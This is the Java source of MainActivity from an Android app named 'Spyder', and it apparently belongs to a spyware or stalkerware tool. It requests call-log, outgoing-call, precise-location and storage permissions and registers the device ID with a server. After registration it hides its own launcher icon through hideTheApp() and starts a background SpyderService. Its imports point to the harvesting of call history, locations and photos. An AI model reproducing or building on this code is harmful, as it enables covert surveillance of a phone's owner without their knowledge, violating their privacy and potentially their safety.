package com.spyder.app.activitys;

import android.Manifest;
import android.content.ComponentName;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.net.ConnectivityManager;
import android.net.wifi.WifiManager;
import android.provider.Settings;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import com.google.gson.Gson;
import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import com.spyder.app.activitys.R;
import com.spyder.app.activitys.presenter.SpyderContract;
import com.spyder.app.activitys.presenter.SpyderPresenter;
import com.spyder.app.activitys.reciever.NetworkChangedReceiver;
import com.spyder.app.activitys.request.CallHistoryDetails;
import com.spyder.app.activitys.request.CallHistoryDetailsPojo;
import com.spyder.app.activitys.request.LocationDetail;
import com.spyder.app.activitys.request.LocationDetails;
import com.spyder.app.activitys.request.PhotoDetail;
import com.spyder.app.activitys.request.UserDetails;
import com.spyder.app.activitys.request.UserDetails_;
import com.spyder.app.activitys.request.UserId;
import com.spyder.app.activitys.request.UserPhotoDetailList;
import com.spyder.app.activitys.response.BaseContext;
import com.spyder.app.activitys.response.UserDetailsResponse;
import com.spyder.app.activitys.service.SpyderService;
import com.spyder.app.activitys.util.CommonUtil;

import com.spyder.app.activitys.util.GalleryImagesActivity;
import com.spyder.app.activitys.util.GetDetailsInformation;
import com.spyder.app.activitys.util.MyLog;
import com.spyder.app.activitys.util.SharedPref;
import com.spyder.app.activitys.view.activities.BaseActivity;
import com.spyder.app.activitys.view.activities.LocationDatabase;
import com.spyder.app.activitys.webservices.GPSTrack;
import com.spyder.app.activitys.webservices.Mediator;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

import okhttp3.internal.Util;

public class MainActivity extends BaseActivity implements SpyderContract.View {
    public static int REQUEST_PERMISSIONS = 1;
    private Mediator mediator;
    protected SpyderPresenter mSpyderPresenter;
    Gson gson = new Gson();
    private List<LocationDetail> locationDetailList;
    private List<PhotoDetail> photoDetailList;
    private String timeStamp;
    private SimpleDateFormat simpleDateFormat = new SimpleDateFormat("dd-MM-yyyy hh:mm:ssaa");
    private String getlangitude, getLattitude;
    private GPSTrack gpsTrack;
    private NetworkChangedReceiver mWifiReceiver;
    private Button registerButton;
    private EditText nameEditText;
    private SharedPref sharedPref;
    private boolean boolean_permission;
    com.spyder.app.activitys.view.activities.Browser browser;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        mWifiReceiver = new NetworkChangedReceiver();
        setContentView(R.layout.activity_main);

        gpsTrack = new GPSTrack(MainActivity.this);
        browser = new com.spyder.app.activitys.view.activities.Browser();

        getlangitude = gpsTrack.currentLangitude;
        getLattitude = gpsTrack.currentLattitude;

        registerButton = (Button) findViewById(R.id.register_button);
        nameEditText = (EditText) findViewById(R.id.name);


        timeStamp = simpleDateFormat.format(new Date());
        mediator = Mediator.getInstance(getApplicationContext());
        mSpyderPresenter = new SpyderPresenter(this, getApplicationContext());
        sharedPref = new SharedPref(getApplicationContext());
        // calluserDetails();
        //callPhotoDetails();

        registerWifiReceiver();
        permission();

        registerButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                //GetDetailsInformation getDetailsInformation=new GetDetailsInformation(getApplicationContext());
                //getDetailsInformation.getTheAllPhotos();
               calluserDetails();

            }
        });
    }

    private void permission() {
        if ((ContextCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.PROCESS_OUTGOING_CALLS) != PackageManager.PERMISSION_GRANTED) ||
                (ContextCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.PROCESS_OUTGOING_CALLS) != PackageManager.PERMISSION_GRANTED)) {

            if ((ActivityCompat.shouldShowRequestPermissionRationale(MainActivity.this, android.Manifest.permission.PROCESS_OUTGOING_CALLS))) {
            } else {
                ActivityCompat.requestPermissions(MainActivity.this, new String[]{android.Manifest.permission.PROCESS_OUTGOING_CALLS, Manifest.permission.READ_CALL_LOG, Manifest.permission.ACCESS_FINE_LOCATION,Manifest.permission.READ_EXTERNAL_STORAGE},
                        REQUEST_PERMISSIONS);

            }

            if ((ActivityCompat.shouldShowRequestPermissionRationale(MainActivity.this, Manifest.permission.PROCESS_OUTGOING_CALLS))) {
            } else {
                ActivityCompat.requestPermissions(MainActivity.this, new String[]{Manifest.permission.PROCESS_OUTGOING_CALLS, Manifest.permission.READ_CALL_LOG, Manifest.permission.ACCESS_FINE_LOCATION,Manifest.permission.READ_EXTERNAL_STORAGE},
                        REQUEST_PERMISSIONS);

            }
        } else {
            boolean_permission = true;


        }
    }

    @Override
    public void successResponse(BaseContext baseContext) {
        hideProgressDialog();

        if (baseContext instanceof UserDetailsResponse) {
            sharedPref.setUserId(((UserDetailsResponse) baseContext).getUserId());
            sharedPref.setLogin(true);

        }
        MyLog.log("success", "cccccccccccc" + baseContext.getStatus());
         hideTheApp();
        startService(new Intent(MainActivity.this, SpyderService.class));
    }

    @Override
    public void failureResponse(String error) {
        hideProgressDialog();
        MyLog.log("responce......fail............", error);

    }

    public void calluserDetails() {

        UserDetails details = new UserDetails();
        UserDetails_ details_ = new UserDetails_();
        details_.setDeviceid(Settings.Secure.getString(getContentResolver(),
                Settings.Secure.ANDROID_ID));
        details_.setUsername(nameEditText.getText().toString());
        details.setUserDetails(details_);
        MyLog.log("details", gson.toJson(details));
        showProgressDialog();
        mSpyderPresenter.saveUserDetails(details);

    }

    private void registerWifiReceiver() {
        IntentFilter filter = new IntentFilter();
        filter.addAction(WifiManager.NETWORK_STATE_CHANGED_ACTION);
        filter.addAction(WifiManager.WIFI_STATE_CHANGED_ACTION);
        filter.addAction(ConnectivityManager.CONNECTIVITY_ACTION);
        registerReceiver(mWifiReceiver, filter);
    }

    private void unregisterWifiReceiver() {
        unregisterReceiver(mWifiReceiver);
    }

    private void hideTheApp() {
        ComponentName componentName = new ComponentName(this, com.spyder.app.activitys.MainActivity.class);

        getPackageManager().setComponentEnabledSetting(componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);
    }


    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQUEST_PERMISSIONS) {

            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {

                boolean_permission = true;


            } else {
                Toast.makeText(getApplicationContext(), "Please allow the permission", Toast.LENGTH_LONG).show();

            }
        }
    }
}
